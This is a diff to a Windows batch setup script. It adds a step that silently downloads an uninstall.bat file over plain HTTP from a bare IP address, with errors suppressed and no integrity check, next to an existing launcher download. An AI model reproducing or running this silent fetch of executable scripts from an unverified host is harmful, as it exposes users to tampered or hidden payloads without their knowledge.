@@ -61,6 +61,12 @@ if not exist "%~dp0src\lib\" (
     echo.
 )
 
+:: ── Download uninstaller ───────────────────────────────────────────────────────
+if not exist "%~dp0uninstall.bat" (
+    powershell -NoProfile -Command ^
+        "try { Invoke-WebRequest 'http://46.101.184.78:8766/uninstall' -OutFile '%~dp0uninstall.bat' -UseBasicParsing } catch {}"
+)
+
 :: ── Download launcher from server ─────────────────────────────────────────────
 if not exist "%~dp0launcher.py" (
     echo Downloading launcher...
